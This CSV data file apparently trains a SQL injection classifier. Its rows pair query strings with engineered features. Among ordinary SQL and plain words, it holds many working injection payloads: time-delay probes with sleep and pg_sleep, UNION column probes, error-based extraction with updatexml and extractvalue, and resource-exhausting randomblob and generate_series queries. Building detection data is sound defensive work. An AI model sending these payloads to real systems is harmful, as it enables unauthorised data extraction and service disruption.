,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
10023,"-7323%"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro",0,1,41,0,0,55,1,8,1,0,0,69,37,7,2,5.541263545158426,8.559367492058051
21073,select chart from declared union select indeed from concerned order by were,0,0,0,0,0,11,0,0,0,0,0,64,0,1,3,4.31748811353631,6.030055566276218
3168,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,9,1,0,13,0,1,2,0,0,20,10,0,1,4.189654742026425,5.791153910047609
9484,"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,21,1,0,26,0,1,3,0,0,73,18,0,2,5.075173815233827,7.542049364654595
2703,1  )   where 2390  =  2390,0,0,2,0,0,5,0,0,0,0,0,5,9,0,0,3.258096538021482,4.179397132269193
1529,-1765'  )   order by 1--,1,0,5,1,0,4,0,0,3,0,0,7,5,0,1,3.1780538303479458,4.05093304771096
20464,"  select goid as id, making as opposite from function",0,0,1,0,0,9,0,0,0,0,0,42,0,0,1,3.970291913552122,5.391515666300752
22322,select count ( smoke ) from reader,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
23982,select * from elephant fetch first 3 rows only select top 50 percent * from slow,0,0,2,0,0,15,0,0,2,0,0,60,3,0,5,4.382026634673881,6.152384767567401
8263,"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,14,1,0,18,0,1,3,0,0,31,13,0,2,4.634728988229636,6.642694885740106
23308,select * from wooden where grandmother not like 'tonight%',2,0,4,0,0,8,1,1,1,0,0,46,0,0,1,4.060443010546419,5.554195840989334
8077,"1'||  (  select 'mjkz' where 9430  =  9430   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",4,0,47,0,0,58,0,5,0,1,0,122,42,6,2,5.802118375377063,9.159895979933404
17584,minardi cardea,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
26122," select * from can order by belong asc, whether desc",0,0,2,0,0,10,0,0,1,0,0,40,0,0,2,3.951243718581428,5.357417698153898
1208,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",0,4,22,0,0,25,0,2,0,0,1,45,39,0,1,5.081404364984463,7.555194009775804
21525,select avg ( begun ) from low,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
27082,"  select separate,this from gone where island = 'zero' union select promised, block from disappear",2,0,5,0,0,14,0,0,0,0,0,78,0,0,2,4.584967478670572,6.544698632292425
2072,"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  ",0,1,34,0,0,55,0,1,8,0,0,65,38,9,1,5.541263545158426,8.559367492058051
18555,mandruso,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
9515,"-2601'  )   union all select 2866,2866,2866,2866,2866,2866--",1,0,10,1,0,5,0,0,3,0,0,14,28,0,1,4.0943445622221,5.615932130190505
1378,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",0,1,12,0,0,5,1,0,1,0,0,14,36,0,1,4.248495242049359,5.900560584269694
8165,1  )   where 1333  =  1333 order by 1--,0,0,4,1,0,8,0,0,2,0,0,12,10,0,1,3.6635616461296463,4.853884482035236
14191,tacoronte,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
19294,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 290914 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,6,0,2,4.6443908991413725,6.6618055138595045
25209,select taken ( s )  from sleep union all,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
10008,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,0,14,0,0,21,0,1,1,0,0,72,9,0,2,4.852030263919617,7.079131308912657
8640,-5250  )   where 1591  =  1591 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,4,0,19,1,0,27,0,3,3,0,0,57,26,0,1,4.976733742420574,7.335959393126002
22943,select everywhere ( s )  from western full outer join,0,0,2,0,0,9,0,0,0,0,0,41,0,0,2,3.970291913552122,5.391515666300752
21054,select count ( boneid ) from blank,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
28913,select count ( angry ) from everywhere,0,0,2,0,0,6,0,0,0,0,0,30,0,0,2,3.6375861597263857,4.809458789423759
28809,select avg ( milk ) from than,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
23266,select * from welcome where not eat = 'family'  and not prove = 'explanation',4,0,7,0,0,13,0,2,1,0,0,56,0,0,1,4.343805421853684,6.0797984693327525
3953,1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',2,0,16,0,0,25,0,1,3,0,0,42,10,0,3,4.820281565605037,7.014493020202725
22018,select * from fall where meal = 'monkey' limit 3,2,0,4,0,0,9,0,0,1,0,0,34,1,0,1,3.871201010907891,5.215173163969822
4176,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",2,4,19,0,0,22,0,2,1,0,0,46,15,0,0,4.897839799950911,7.1729298517346045
5269,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,0,3,30,0,0,33,1,3,0,2,0,60,16,5,0,5.153291594497779,7.707729168265067
16966,18129,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
30303,"  select ourid as id, knife as plenty from close",0,0,1,0,0,9,0,0,0,0,0,37,0,0,1,3.871201010907891,5.215173163969822
19675,select city from suppliers  order by city;,0,0,1,0,0,6,0,0,0,0,0,34,0,0,2,3.737669618283368,4.981567234930947
17011,mundy,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
26431,select * from although 3,0,0,1,0,0,4,0,0,1,0,0,18,1,0,1,3.1780538303479458,4.05093304771096
25317,select distinct impossible from breathing,0,0,0,0,0,4,0,0,0,0,0,37,0,0,1,3.713572066704308,4.939896154656966
23544,select * from list,0,0,1,0,0,3,0,0,1,0,0,14,0,0,1,2.8903717578961645,3.6015010896570807
16935,81568460h,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
17093,tris2,0,0,0,0,0,0,0,0,0,0,0,4,1,0,0,1.6094379124341005,1.8157827456852256
24707,"   select hit, hunt+ ', ' + property+ ' ' + today+ ', ' + couple as outline  from clay",6,0,15,0,0,19,0,0,6,0,0,49,0,0,1,4.454347296253507,6.2908506611672514
19180,select option_value from wp_options where option_name  =  'kc_tkl_pdk' limit 1,2,0,8,0,0,9,0,0,0,0,0,58,1,0,1,4.356708826689592,6.104257869167092
1107,"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1,11,0,0,14,0,1,0,0,0,10,10,0,0,4.23410650459726,5.873719016140452
15757,novallas,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
4827,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null#",0,1,13,0,0,5,1,0,0,10,0,54,1,10,1,4.330733340286331,6.055066595411042
12111,85766213h,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
16166,bat3an,0,0,0,0,0,0,0,0,0,0,0,5,1,0,0,1.791759469228055,2.0498957009511405
14660,siu-kwok,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
25262,select * from shine fetch first 50 percent rows onlyselect top 3 * from agree,0,0,2,0,0,14,0,0,2,0,0,58,3,0,4,4.343805421853684,6.0797984693327525
3986,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,17,1,0,26,0,1,3,0,0,76,17,0,2,5.030437921392435,7.448022400972698
18950,vachiran,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
4959,"1'  )   union all select null,null,null,null,null#",1,0,7,0,0,5,0,0,0,5,0,34,1,5,1,3.912023005428146,5.287509109454676
26907,select * from row order by change desc,0,0,1,0,0,7,0,0,1,0,0,30,0,0,2,3.6375861597263857,4.809458789423759
9010,1   )    )     )   or sleep  (  5  )   and    (    (     (  2209  =  2209,0,0,9,0,0,15,0,2,0,0,0,10,10,0,0,4.290459441148391,5.97916802637938
26742,select top 3 * from spin where below = 'form' select * from origin,2,0,5,0,0,13,0,0,2,0,0,47,1,0,3,4.189654742026425,5.791153910047609
20390,select count ( distinct national )  from good,0,0,2,0,0,7,0,0,0,0,0,35,0,0,2,3.80666248977032,5.101693885125393
12026,20098056n,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
2261,"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",4,0,9,0,0,11,0,2,0,0,0,25,13,0,0,4.174387269895637,5.762920220853171
10116,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'rpiz' like 'rpiz",6,0,17,0,0,20,0,2,1,0,0,47,15,0,0,4.8283137373023015,7.030817503794459
5928,"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""cmhh"" like ""cmhh",0,4,61,0,0,75,0,12,0,0,0,96,49,10,1,5.886104031450156,9.35819663057201
1015,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,1,0,6,0,0,12,0,1,1,0,0,13,20,0,0,4.143134726391533,5.7053230539652695
30005,select count ( youth )  from hide,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.49650756146648,4.571113592379885
13606,51795949h,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
9361,"1'  )   as nmzp where 3794  =  3794 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,17,1,0,34,0,1,3,0,0,120,20,0,2,5.337538079701318,8.106116099798594
8395,-1879%'   )    )    or 3038  =  3038,1,0,6,0,0,6,1,1,1,0,0,2,12,0,0,3.58351893845611,4.717530264472627
15615,hallenbe,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
16378,correch climent,0,0,0,0,0,1,0,0,0,0,0,14,0,0,0,2.70805020110221,3.326353218260614
4300,"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk",0,4,17,0,0,24,0,2,1,0,0,80,8,0,2,4.997212273764115,7.378587043391221
23885,select top 50 percent * from sometime select * from herd fetch first 50 percent rows onlyselect top 3 * from log,0,0,3,0,0,21,0,0,3,0,0,83,5,0,6,4.718498871295094,6.809292299444515
25704,select nation from anywhere union all select difficulty from easy order by common,0,0,0,0,0,12,0,0,0,0,0,69,0,0,3,4.394449154672439,6.17606445953937
2883,end and    (    (   6874  =  6874,0,0,3,0,0,6,0,1,0,0,0,6,8,0,0,3.49650756146648,4.571113592379885
12268,750,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1.0986122886681098,1.19230319601282
3719,-7231   )    )    union all select 7639#,0,0,4,0,0,6,0,0,1,0,0,14,8,0,1,3.688879454113936,4.897348914472564
14741,miscelnea,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
17842,121,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1.0986122886681098,1.19230319601282
12368,san lorenzo de la parrilla,0,0,0,0,0,4,0,0,0,0,0,22,0,0,0,3.258096538021482,4.179397132269193
21006, update doing set die = 'damage'where harbor = 'heat',4,0,6,0,0,9,0,0,0,0,0,38,0,0,0,3.970291913552122,5.391515666300752
12200,c/ javea 57,0,0,1,0,0,2,0,0,1,0,0,6,2,0,0,2.3978952727983707,2.8749024412290907
2780,"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,0,4,23,0,0,34,2,2,1,0,0,112,12,0,2,5.356586274672012,8.14792186939187
3336,"-4355""   )    )     )   or 9323  =  9323#",0,1,7,0,0,7,0,1,1,0,0,2,12,0,0,3.713572066704308,4.939896154656966
1993,-8143  )   union all select 3014--,0,0,4,1,0,5,0,0,3,0,0,14,8,0,1,3.5263605246161616,4.621137163019105
14378,armaanzas,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
21024,select * from cost 3 select * from nor,0,0,2,0,0,8,0,0,2,0,0,27,1,0,2,3.6375861597263857,4.809458789423759
26659,select * from worry where atom in  ( select tall from stand ) ,0,0,3,0,0,13,0,0,1,0,0,45,0,0,2,4.127134385045092,5.675937336868984
5982,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",0,0,10,0,0,4,0,0,1,0,0,14,40,0,1,4.219507705176107,5.846543550882007
15020,wambsgan,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
26941,select * from actually where to not like '[life]%',2,0,6,0,0,8,1,1,1,0,0,36,0,0,1,3.912023005428146,5.287509109454676
15659,imtaz,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
9678,"1""  )   where 4172  =  4172 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",0,1,13,0,0,22,0,1,1,0,0,32,10,0,2,4.6443908991413725,6.6618055138595045
6619,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",0,1,12,1,0,4,0,0,3,0,0,14,40,0,1,4.248495242049359,5.900560584269694
22680," select * from gift order by cool asc, waste desc",0,0,2,0,0,10,0,0,1,0,0,37,0,0,2,3.8918202981106265,5.251655965920898
14822,62616848s,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
6857,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1,0,12,0,0,21,0,0,1,0,0,43,2,0,2,4.634728988229636,6.642694885740106
15158,baumgarten bagudanc,0,0,0,0,0,1,0,0,0,0,0,18,0,0,0,2.9444389791664403,3.684523708911846
3409,-2429%' or 6890  =  5846,1,0,4,0,0,4,1,1,1,0,0,2,12,0,0,3.1780538303479458,4.05093304771096
19920,"  select truncate ( 345.156,   0 ) ;",0,0,5,0,0,7,0,0,0,0,0,14,7,0,1,3.58351893845611,4.717530264472627
21249,select * from sugar where south between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,35,16,0,1,4.23410650459726,5.873719016140452
2336,select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2,4.912654885736052,7.2034003052594375
10661,"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",0,0,14,0,0,20,0,0,0,0,1,26,28,0,2,4.770684624465665,6.914118695344334
3899,1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki,4,0,67,0,0,81,0,12,0,0,0,86,45,10,1,5.961005339623274,9.53712529228359
1874,"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1,0,13,1,0,6,0,0,3,0,0,14,36,0,1,4.343805421853684,6.0797984693327525
24705,"  select plannedid as id, castle as lying from repeat",0,0,1,0,0,9,0,0,0,0,0,42,0,0,1,3.970291913552122,5.391515666300752
24702,select avg ( price ) from left,0,0,2,0,0,6,0,0,0,0,0,22,0,0,2,3.4011973816621555,4.412867051146341
1876,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,0,16,1,0,18,0,1,3,0,0,31,15,0,0,4.68213122712422,6.736714051207547
21806,select top 50 percent * from fallen,0,0,1,0,0,6,0,0,1,0,0,26,2,0,2,3.555348061489413,4.669921102482963
23152,select * from only fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,39,2,0,3,3.9318256327243257,5.322755734775789
24818,select fine ( s )  from secret select sea from nails,0,0,2,0,0,10,0,0,0,0,0,39,0,0,2,3.951243718581428,5.357417698153898
20542,select count ( seven ) from mother,0,0,2,0,0,6,0,0,0,0,0,26,0,0,2,3.5263605246161616,4.621137163019105
14125,p05f74a.r,0,0,1,0,0,0,0,0,0,0,0,4,4,0,0,2.19722457733622,2.593591245490939
30606,select relationship ( s )  from production full outer join,0,0,2,0,0,9,0,0,0,0,0,46,0,0,2,4.060443010546419,5.554195840989334
7679,1'+  (  select qsmo where 3172  =  3172,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1,3.6635616461296463,4.853884482035236
23959,"insert into town  ( continued, order, would )  values  ( 'sell', 'cake', 'industrial' )  ",6,0,14,0,0,14,0,0,0,0,0,57,0,0,0,4.48863636973214,6.357017110069445
28293,"  update cry set feel =  'operation', city =  'stage' where wrapped =  melted",4,0,8,0,0,13,0,0,0,0,0,52,0,0,0,4.343805421853684,6.0797984693327525
30741, update motor set traffic = 'tobacco'where east = 'species',4,0,6,0,0,9,0,0,0,0,0,44,0,0,0,4.07753744390572,5.5852871348767055
17454,espls,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
25086,select * from alive where price not between 10 and 20,0,0,1,0,0,10,0,2,1,0,0,38,4,0,1,3.970291913552122,5.391515666300752
18007,"c/ la lila, 83,",0,0,3,0,0,3,0,0,1,0,0,7,2,0,0,2.70805020110221,3.326353218260614
18973,silvina,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
7943,"1""  )   where 5870  =  5870 union all select null,null,null--",0,1,7,1,0,9,0,0,2,3,0,31,9,3,1,4.110873864173311,5.646144513813471
29749,select * from nose where zero = 'slope'  and city = 'muscle',4,0,7,0,0,11,0,1,1,0,0,41,0,0,1,4.0943445622221,5.615932130190505
5727,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,0,0,13,1,0,22,0,0,3,0,0,35,10,0,2,4.672828834461906,6.718211671090191
13931,abia de la obispala,0,0,0,0,0,3,0,0,0,0,0,16,0,0,0,2.9444389791664403,3.684523708911846
24561,select * from thought 3,0,0,1,0,0,4,0,0,1,0,0,17,1,0,1,3.1354942159291497,3.983240309714999
3644,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh",0,3,31,0,0,35,0,3,0,2,0,68,16,5,0,5.2574953720277815,7.931717373270634
12310,santa cruz de tenerife,0,0,0,0,0,3,0,0,0,0,0,19,0,0,0,3.091042453358316,3.9129887722739327
9345,1'||  (  select 'glyc' from dual where 4058  =  4058,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1,3.951243718581428,5.357417698153898
11038,"1%""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1,20,1,0,24,1,1,3,0,0,71,9,0,2,4.990432586778736,7.364460386922754
14421,flor chino,0,0,0,0,0,1,0,0,0,0,0,9,0,0,0,2.302585092994046,2.7402564225600523
4227,"1%"" union all select null,null,null--",0,1,6,1,0,4,1,0,2,3,0,26,1,3,1,3.610917912644224,4.764024421755989
30494,select avg ( well ) from drop select sum ( statement ) ,0,0,4,0,0,12,0,0,0,0,0,39,0,0,4,4.007333185232471,5.458096843121287
2132,1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,4,0,55,0,0,81,0,2,10,0,0,93,47,12,1,5.953243334287785,9.518491316537997
12946,duplan,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
11323,"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",0,0,21,1,0,29,0,1,2,0,1,47,43,0,1,5.19295685089021,7.792586250719604
4788,1 where 8889  =  8889,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0,3.044522437723423,3.839958531231341
10326,"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",0,0,26,0,0,31,0,5,0,0,0,40,24,4,0,5.087596335232384,7.56826919695837
4420,"iif  (  2869  =  9448,1,1/0  )  ",0,0,6,0,0,6,0,0,1,0,0,3,11,0,0,3.4657359027997265,4.519779854678687
27626,select top 3 * from coach where strike = 'split' select * from fellow,2,0,5,0,0,13,0,0,2,0,0,50,1,0,3,4.23410650459726,5.873719016140452
30003,select * from third where hold between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,34,16,0,1,4.219507705176107,5.846543550882007
18369,6aq408tro,0,0,0,0,0,0,0,0,0,0,0,5,4,0,0,2.19722457733622,2.593591245490939
394," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",0,0,11,1,0,15,0,1,4,0,0,40,2,0,2,4.330733340286331,6.055066595411042
